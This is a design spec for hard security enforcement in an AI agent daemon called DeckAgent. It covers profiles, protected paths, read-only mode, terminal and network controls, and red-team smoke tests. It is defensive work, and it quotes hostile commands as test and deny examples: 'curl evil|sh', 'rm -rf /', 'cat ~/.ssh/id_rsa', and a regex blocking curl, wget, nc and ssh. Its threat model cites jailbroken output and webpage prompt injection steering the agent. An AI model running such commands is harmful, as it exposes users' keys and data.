# DeckAgent — Hard Security Enforcement Spec (Wave 4)

> **Principle:** Security is enforced in the **daemon policy engine before any tool runs**.  
> Prompts, MCP `instructions`, and “please don’t” system text are **not controls**.  
> If a mode is on, the matching MCP tools must be **rejected in code** (and preferably **hidden from `tools/list`**).

> Status: **IMPLEMENTED (Wave 4)** — hard enforcement shipped; see security:smoke.
Builds on existing `policy.json` + `checkToolAllowed()` (which already hard-blocks `read_only` for a mutating set — this wave closes gaps and adds stronger path/shell/network controls).

---

## 0. Threat model (short)

| Attacker | Goal | Trust boundary |
|----------|------|----------------|
| Malicious / jailbroken LLM output | `rm -rf`, exfil keys, edit `~/.ssh` | Daemon policy must stop execution |
| Compromised MCP client / stolen API token | Full tool surface | Same policy + budgets + confirmations |
| Prompt injection from a webpage (browser tools) | Trick model into shell/fs abuse | Browser + path + command hard gates |
| Confused agent (not evil) | Edit wrong tree / overwrite secrets | Trusted dirs + denied dirs + workspace |

**Out of scope for Wave 4:** kernel sandboxing as the only defense, multi-user OS isolation, defending against root on the same machine.

---

## 1. What exists today (baseline)

### Already hardcoded (good)
- `read_only` → daemon rejects tools in `MUTATING_TOOLS` before execute
- `allow_terminal` / `allow_browser` → category kill switches
- `allowed_directories` path prefix checks (with `realpath` when possible)
- `command_mode: allowlist|blocklist` + dangerous regex patterns
- Workspace outside-tree confirmation / deny
- Local confirmation server (not client `_preconfirmed`)
- Budgets → `BUDGET_EXCEEDED`
- Audit log with secret redaction

### Gaps this wave closes
1. **`tools/list` still advertises blocked tools** — model keeps trying; noisy and bypass-prone UX
2. **`read_only` mutating set incomplete vs capability** — e.g. shell can still mutate disk if terminal allowed and command not blocked (`echo x > file`, `tee`, `python -c open().write`)
3. **No explicit denied / protected paths** — only allowlist; cannot say “allow `~/code` but never `~/code/.env`”
4. **Symlink / `..` / mixed separators** — partially handled; need canonicalization policy + post-resolve re-check
5. **Shell is still a universal escape** from FS policy unless terminal is off or allowlisted tightly
6. **No security profiles** — users must assemble flags; easy to misconfigure
7. **Control UI can weaken policy** without step-up auth
8. **Worker does not know policy** — cannot filter catalog at edge (optional enhancement)

---

## 2. Design rules (non-negotiable)

1. **Fail closed.** Missing/invalid policy → deny mutating tools (or refuse daemon start).
2. **Enforce twice for paths:** before execute (args) and after resolve (realpath / final target).
3. **Shell equals full FS.** If `allow_terminal` and not allowlist-strict, assume FS allowlist is **advisory only**; document that. Prefer **terminal allowlist** or **`read_only` implies terminal off**.
4. **Hide disabled tools** from MCP `tools/list` / Worker catalog projection.
5. **Never trust the model or MCP client** for policy decisions.
6. **Audit every deny** with code: `READ_ONLY`, `PATH_DENIED`, `PATH_PROTECTED`, `TOOL_DISABLED`, `PROFILE_LOCKED`, etc.
7. **No “soft read-only”** via prompts. If we add a prompt, it is UX only and must mirror hard policy.

---

## 3. Feature plan (prioritized)

| ID | Feature | Enforcement locus | Priority |
|----|---------|-------------------|----------|
| S1 | **Security profiles** (`strict` / `dev` / `locked`) | Daemon policy defaults + lock bit | **P0** |
| S2 | **Hard capability matrix + tools/list filtering** | Daemon → Worker catalog sync or filter on list | **P0** |
| S3 | **Trusted dirs + denied dirs + protected paths** | `checkPathAllowed` rewrite | **P0** |
| S4 | **`read_only` v2** (implies no shell / no browser / no restore) | Policy normalize + MUTATING expand | **P0** |
| S5 | **Path canonicalization & symlink policy** | Daemon path resolver | **P0** |
| S6 | **Terminal containment modes** | Command policy + optional argv parser | **P1** |
| S7 | **Network egress policy** (browser + curl family) | Command patterns + browser URL allowlist | **P1** |
| S8 | **Policy lock + UI step-up** | Control UI / CLI | **P1** |
| S9 | **Sensitive path defaults** (`~/.ssh`, cloud creds, …) | Built-in deny list (hardcoded) | **P0** |
| S10 | **Per-tool path modes** (read vs write trees) | Dual allowlists | **P1** |

**Recommended ship order:** S1 → S4 → S9 → S3 → S5 → S2 → S6 → S7 → S8 → S10.

---

## 4. Detailed specs

### S1 — Security profiles

#### Problem
Too many knobs; users leave `allowed_directories: ["~"]` + terminal on.

#### Spec
`policy.json`:
```json
{
  "version": 2,
  "profile": "strict",
  "profile_locked": false
}
```

| Profile | Meaning (applied as **hard defaults**, still overridable until locked) |
|---------|------------------------------------------------------------------------|
| `strict` | Workspace-required OR single project dir; `read_only` false but write only under trusted write roots; `command_mode: allowlist` with small list (`git`, `npm`, `node`, `python`, `pytest`, `cargo`, `go`, `make`); browser off; secrets injection off by default |
| `dev` | Current “power user” posture: blocklist commands, confirmation on mutators, browser optional |
| `locked` | Same as active profile + **`profile_locked: true`**: Control UI cannot change policy; only CLI with local confirmation file unlock |

#### Hard behavior
- On daemon start, if `profile` set, **normalize** missing fields to profile defaults (do not silently widen).
- If `profile_locked`, reject `POST /api/policy` and `deckagent policy set` without unlock.

#### Acceptance
- Fresh `strict` install cannot `execute_command` `curl evil|sh` (allowlist miss) and cannot write outside trusted write roots.
- `locked` blocks Control UI policy toggle (HTTP 403 `PROFILE_LOCKED`).

---

### S2 — Capability matrix + hide tools from MCP

#### Problem
Advertising blocked tools trains the model to retry forever and leaks surface area.

#### Spec
Define hardcoded capability groups:

| Capability | Tools |
|------------|-------|
| `fs_read` | read_file, read_multiple_files, list_directory, get_file_info, search_files, list_snapshots |
| `fs_write` | write_file, edit_file, create_directory, move_file, restore_snapshot |
| `terminal` | execute_command, execute_command_stream, list_processes, kill_process |
| `browser` | browser_* |
| `meta` | get_environment |

Effective capabilities from policy:
```
read_only            → disable fs_write + terminal + browser (+ restore)
!allow_terminal      → disable terminal
!allow_browser       → disable browser
profile strict       → terminal only if allowlist non-empty
```

#### Hard behavior
1. `checkToolAllowed` denies with `TOOL_DISABLED` / `READ_ONLY` if capability off.
2. **`tools/list` returns only enabled tools** (daemon reports enabled set to Worker on auth/heartbeat, OR Worker asks daemon; MVP: daemon sends `capabilities` on `auth_ok` path via new message `policy_caps`).
3. MCP `instructions` may mention limits, but list filtering is authoritative.

#### Acceptance
- With `read_only: true`, `tools/list` contains zero of `write_file`, `edit_file`, `execute_command`, `restore_snapshot`, …
- Calling a hidden tool still returns deny (defense in depth).

---

### S3 — Trusted dirs, denied dirs, protected paths

#### Problem
Allowlist alone cannot express “everything under `~/code/app` except `.env` and `node_modules` writes”.

#### Spec — new policy fields
```json
{
  "trusted_directories": ["~/code/myapp"],
  "denied_directories": ["~/code/myapp/node_modules", "~/.deckagent/secrets.json"],
  "protected_paths": [
    "~/.ssh",
    "~/.gnupg",
    "~/.aws",
    "~/.config/gcloud",
    "**/.env",
    "**/.env.*",
    "**/credentials.json",
    "**/id_rsa",
    "**/*.$"
  ],
  "path_rules": {
    "symlink_mode": "deny_escape",
    "allow_dotdot": false
  }
}
```

Semantics (all **hard**):
1. **trusted_directories** — replaces / tightens `allowed_directories` (alias migration: if `trusted_directories` empty, fall back to `allowed_directories` for one version).
2. Final path must be inside **at least one** trusted dir.
3. Final path must **not** be inside any **denied_directories**.
4. Final path must **not** match **protected_paths** globs (for **write/mutate**; reads of protected paths default **deny** too in `strict`, configurable `protected_path_policy: "deny_all" | "deny_write"`).
5. Evaluation order: canonicalize → trusted? → denied? → protected? → workspace boundary.

#### Error codes
- `PATH_UNTRUSTED` — outside trusted dirs  
- `PATH_DENIED` — hits denied_directories  
- `PATH_PROTECTED` — hits protected globs  

#### Acceptance
- Trusted `~/code/app`, write `~/code/app/.env` → `PATH_PROTECTED`
- Write `~/code/app/src/x.ts` → allow (subject to other gates)
- Read `~/.ssh/id_rsa` → deny in strict

---

### S4 — `read_only` v2 (complete hard gate)

#### Problem
Today `read_only` blocks a mutating tool set, but **shell can still mutate files**.

#### Spec — normalize on load
When `read_only: true`, daemon **forces**:
```json
{
  "allow_terminal": false,
  "allow_browser": false,
  "allow_secret_injection": false,
  "allow_computer_use": false
}
```
And expands deny to any tool not in `fs_read` + `get_environment` (+ optional `list_snapshots` as read).

Optional stricter flag:
```json
"read_only_mode": "fs_read" | "meta_only"
```
- `fs_read` — list/read/search only  
- `meta_only` — only `get_environment` (+ resources)

#### Hard behavior
- Normalization happens in `readPolicy()` so Control UI cannot set `read_only: true` while leaving terminal on.
- If someone edits JSON by hand to contradict, **daemon start warns and re-forces**.

#### Acceptance
- `read_only: true` + hand-edited `allow_terminal: true` → effective terminal still off; `execute_command` → `READ_ONLY`
- `tools/list` matches effective capabilities

---

### S5 — Path canonicalization & symlink policy

#### Spec
`path_rules.symlink_mode`:
| Mode | Behavior |
|------|----------|
| `deny_escape` (default) | `realpath` final target; if realpath leaves trusted root → deny |
| `deny_symlinks` | any symlink component → deny |
| `follow` | follow symlinks but still require final realpath inside trusted (escape still denied) |

Also:
- Reject NUL bytes, `\\??\\`, mixed unc paths on Windows
- Resolve `..` before checks; if `allow_dotdot: false`, reject args containing `..` **before** resolve (belt and suspenders)
- For `move_file`, check **both** source and destination under rules
- For `edit_file`/`write_file`, re-check after creating parent dirs? Check destination path pre-create with normalized absolute join

#### Acceptance
- Symlink from trusted dir to `~/.ssh/authorized_keys` → deny under `deny_escape`
- Arg `trusted/../../.ssh/id_rsa` → deny

---

### S6 — Terminal containment modes

#### Spec
```json
"terminal_mode": "off" | "allowlist" | "blocklist" | "sandbox_fs"
```

| Mode | Hard meaning |
|------|----------------|
| `off` | Same as `allow_terminal: false` |
| `allowlist` | Current allowlist (required in `strict`) |
| `blocklist` | Current blocklist + dangerous patterns |
| `sandbox_fs` | **P1/P2:** wrap command with OS sandbox if available (`bubblewrap` / `sandbox-exec`) binding only trusted dirs read/write; if sandbox binary missing → **refuse to run shell** (fail closed) |

Additional hard rules:
- In `strict`, `terminal_mode` cannot be `blocklist`.
- Detect obvious redirects / write builtins in allowlist mode: if command matches `[><]|tee\b|dd\b` and path outside trusted write roots → deny (best-effort heuristic; full shell parsing is undecidable — document residual risk).

#### Acceptance
- `strict` + `rm -rf /` → deny  
- `sandbox_fs` without bwrap → `TERMINAL_SANDBOX_UNAVAILABLE` (not silent run)

---

### S7 — Network egress policy

#### Spec
```json
"network": {
  "allow_browser_hosts": ["docs.python.org", "*.github.com"],
  "deny_browser_hosts": ["*"],
  "block_shell_net_tools": true
}
```

Hard behavior:
- If `block_shell_net_tools: true` (default in `strict`), deny commands matching `\b(curl|wget|nc|ncat|fetch|httpie|ssh|scp|rsync)\b` unless explicitly in allowlist entry that users added knowing the risk.
- Browser `browser_navigate` / evaluate fetch: allow only hosts matching allow list; default deny all in `strict`, allow all in `dev` if browser enabled.

#### Acceptance
- `strict` + `curl https://evil` → deny  
- Browser navigate to non-allowed host → `NETWORK_DENIED`

---

### S8 — Policy lock & Control UI step-up

#### Spec
- `profile_locked: true` → UI policy POSTs return 403
- Unlock: `deckagent policy unlock` writes a one-time local token to `~/.deckagent/unlock.token` (0600, TTL 5 min); UI must send header `X-DeckAgent-Unlock: …`
- Lock again on TTL or `deckagent policy lock`

#### Acceptance
- Locked profile: toggle read_only in UI fails  
- Unlock token works once / until expiry

---

### S9 — Built-in sensitive path denylist (hardcoded)

Hardcoded in daemon (not only policy.json), always applied, **cannot be removed by profile `dev` without explicit**:
```json
"disable_builtin_protections": false
```
If `true` (dangerous), require `profile_locked` false + confirmation on daemon start stderr banner.

Built-in protected prefixes/globs (examples):
- `~/.ssh`, `~/.gnupg`
- `~/.aws`, `~/.azure`, `~/.config/gcloud`
- `~/.docker/config.json`
- `**/.env`, `**/.env.*`
- `**/id_rsa`, `**/id_ed25519`, `**/*.pem` (write deny; read deny in strict)
- `~/.deckagent/secrets.json`, `~/.deckagent/config.json` (write deny always)

#### Acceptance
- Even with `trusted_directories: ["~"]`, write to `~/.ssh/authorized_keys` → `PATH_PROTECTED`

---

### S10 — Separate read vs write trees (optional P1)

```json
{
  "trusted_read_directories": ["~/code/myapp", "~/Downloads"],
  "trusted_write_directories": ["~/code/myapp/src", "~/code/myapp/tests"]
}
```

- Read tools use read list; write/mutate tools use write list (subset).
- Default: if only `trusted_directories` set, it applies to both.

---

## 5. MCP / Worker behavior

### Error shape (hard denies)
Always return tool result or JSON-RPC error with stable codes (prefer tool result `isError: true` for policy, HTTP 200 — already done for soft policy):

```text
[READ_ONLY] Tool 'write_file' is blocked because policy is read-only
[PATH_PROTECTED] Refusing access to protected path '~/.ssh/id_rsa'
[TOOL_DISABLED] Terminal capability is disabled
[NETWORK_DENIED] Host 'evil.test' is not allowed
[PROFILE_LOCKED] Policy changes are locked
```

### `tools/list` filtering
Worker catalog must be **intersected** with daemon-reported capabilities within 1 heartbeat of policy change.

### Resources
Add `deckagent://security` → JSON summary of **effective** policy (not raw secrets): profile, read_only, trusted/denied counts, terminal_mode, network mode, locked bit. Helps agents adapt without guessing.

---

## 6. First-run / CLI UX (still hard defaults)

```bash
deckagent setup
# Security profile? [strict/dev] (default strict)
# Trusted project directory? (~/DeckAgent or path)
# Enable terminal? [y/N] in strict default N unless allowlist chosen
```

Commands:
```bash
deckagent policy show          # effective policy
deckagent policy set-profile strict
deckagent policy trust ~/code/app
deckagent policy deny ~/code/app/.env
deckagent policy lock | unlock
```

---

## 7. Testing plan (mandatory)

### Unit (daemon)
- Matrix: each profile × each tool → allow/deny
- Symlink escape fixtures
- Protected glob fixtures
- `read_only` forces terminal off even if JSON says otherwise
- `tools/list` filter snapshot tests

### Integration
- Live MCP: `read_only` → write_file denied; tools/list omits write tools
- Live: write `.env` under trusted tree → `PATH_PROTECTED`
- Live: Control UI lock

### Red-team scripts (checked into `scripts/security-smoke.mjs`)
Attempt:
1. `execute_command` with `cat ~/.ssh/id_rsa`  
2. `write_file` to denied path  
3. Symlink escape  
4. `python -c 'open("/etc/passwd").read()'` under allowlist-only `python` (document residual; prefer sandbox_fs)  

---

## 8. Residual risks (honest)

| Risk | Mitigation |
|------|------------|
| Arbitrary shell with broad allowlist (`bash`, `python`) | `strict` default allowlist without shells; `sandbox_fs`; or terminal off |
| Kernel-level bypass | Not claimed; run OS user without unnecessary groups |
| Stolen API token | Rotate tokens; budgets; lock profile; don’t expose trycloudflare long-term |
| Browser XSS → tool calls | Host allowlist; confirmation on mutators |

---

## 9. Implementation map

| Package | Work |
|---------|------|
| `desktop-daemon` | Profile normalize, path engine v2, capability filter, builtin protections, lock, network/terminal modes, `deckagent://security` |
| `cloudflare-worker` | Filter `tools/list` from daemon caps; security resource optional proxy |
| `mcp-server` | No prompt-based security; keep tools pure |
| `cli` | profile/trust/deny/lock commands; setup defaults to `strict` |
| `docs` | Replace “be careful” with enforcement matrix |

Build order: daemon policy core → CLI → Worker list filter → security smoke.

---

## 10. Success criteria

Wave 4 is done when:

1. **`read_only: true` hard-disables terminal + browser + all writers**, even if JSON contradicts.  
2. **Protected paths cannot be read/written** under a home-wide trust root.  
3. **`tools/list` never shows disabled tools.**  
4. **`strict` profile** is the setup default and passes `scripts/security-smoke.mjs`.  
5. No security control in the docs relies on “tell the model not to.”

---

## 11. Open decisions (defaults if unanswered)

1. Default profile: **`strict`**.  
2. Protected paths: **deny read+write** in strict; **deny write only** in dev.  
3. Symlink mode: **`deny_escape`**.  
4. `sandbox_fs`: implement after allowlist; fail closed if unavailable.  
5. Renaming: keep `allowed_directories` as deprecated alias of `trusted_directories` for one minor version.
